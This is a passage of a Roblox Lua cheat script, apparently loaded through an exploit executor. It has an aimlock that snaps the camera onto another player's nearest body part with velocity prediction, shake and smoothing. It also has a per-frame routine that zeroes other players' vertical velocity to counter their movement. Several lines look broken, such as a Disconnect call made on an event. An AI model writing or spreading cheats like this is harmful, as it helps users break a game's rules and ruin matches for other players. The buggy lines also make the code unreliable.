    local IsOnScreen = game.Workspace.CurrentCamera:WorldToScreenPoint(Object.Position)
    return IsOnScreen
end

local function Filter(Object)
    if string.find(Object.Name, "Gun") then
        return
    end
    if Object:IsA("Part") or Object:IsA("MeshPart") then
        return true
    end
end

local function WTSPos(Position)
    local ObjectVector = game.Workspace.CurrentCamera:WorldToScreenPoint(Position)
    return Vector2.new(ObjectVector.X, ObjectVector.Y)
end

local function WTS(Object)
    local ObjectVector = game.Workspace.CurrentCamera:WorldToScreenPoint(Object.Position)
    return Vector2.new(ObjectVector.X, ObjectVector.Y)
end

function GetNearestPartToCursorOnCharacter(character)
    local ClosestDistance = math.huge
    local BodyPart = nil

    if (character and character:GetChildren()) then
        for k,  x in next, character:GetChildren() do
            if Filter(x) and IsOnScreen(x) then
                local Distance = (WTS(x) - Vector2.new(Mouse.X, Mouse.Y)).Magnitude
    
                if Distance < ClosestDistance then
                    ClosestDistance = Distance
                    BodyPart = x
                end
            end
        end
    end

    return BodyPart
end

game.RunService.Heartbeat:Connect(function()
    if getgenv().DNS.Tracer.Enabled == true and Plr and Plr.Character ~= nil then
        if getgenv().DNS.Misc.UnlockedOnDeath then
            if Plr.Character.BodyEffects["K.O"].Value then Plr = nil end
        end
        if getgenv().DNS.Misc.Shake then
            local Main = CFrame.new(Camera.CFrame.p,Plr.Character[getgenv().DNS.Tracer.Part].Position + Plr.Character[getgenv().DNS.Tracer.Part].Velocity * getgenv().DNS.Tracer.Pred +
            Vector3.new(
                math.random(-getgenv().DNS.Misc.ShakeValue, getgenv().DNS.Misc.ShakeValue),
                math.random(-getgenv().DNS.Misc.ShakeValue, getgenv().DNS.Misc.ShakeValue),
                math.random(-getgenv().DNS.Misc.ShakeValue, getgenv().DNS.Misc.ShakeValue)
            ) * 0.1)
            Camera.CFrame = Camera.CFrame:Lerp(Main, getgenv().DNS.Tracer.Smoothness, Enum.EasingStyle.Elastic, Enum.EasingDirection.InOut, Enum.EasingStyle.Sine, Enum.EasingDirection.Out)
        else
            local Main = CFrame.new(Camera.CFrame.p,Plr.Character[getgenv().DNS.Tracer.Part].Position + Plr.Character[getgenv().DNS.Tracer.Part].Velocity * getgenv().DNS.Tracer.Pred)
            Camera.CFrame = Camera.CFrame:Lerp(Main, getgenv().DNS.Tracer.Smoothness, Enum.EasingStyle.Elastic, Enum.EasingDirection.InOut, Enum.EasingStyle.Sine, Enum.EasingDirection.Out)
        end
    end
end)

task.spawn(function()
    while task.wait() do
        if getgenv().DNS.Tracer.Enabled and Plr ~= nil and (Plr.Character) then
            getgenv().DNS.Tracer.Part = tostring(GetNearestPartToCursorOnCharacter(Plr.Character))
        end
    end
end)
wait(1)
local RunService = game:GetService("RunService")

local function zeroOutYVelocity(hrp)
    hrp.Velocity = Vector3.new(hrp.Velocity.X, 0, hrp.Velocity.Z)
    hrp.AssemblyLinearVelocity = Vector3.new(hrp.Velocity.X, 0, hrp.Velocity.Z)
end

local function onPlayerAdded(player)
    player.CharacterAdded:Connect(function(character)
        local hrp = character:WaitForChild("HumanoidRootPart")
        zeroOutYVelocity(hrp)
    end)
end

local function onPlayerRemoving(player)
    player.CharacterAdded:Disconnect()
end

game.Players.PlayerAdded:Connect(onPlayerAdded)
game.Players.PlayerRemoving:Connect(onPlayerRemoving)

RunService.Heartbeat:Connect(function()
    pcall(function()
        for i, player in pairs(game.Players:GetChildren()) do
            if player.Name ~= game.Players.LocalPlayer.Name then
                local hrp = player.Character.HumanoidRootPart
                zeroOutYVelocity(hrp)
            end
        end
    end)
end)
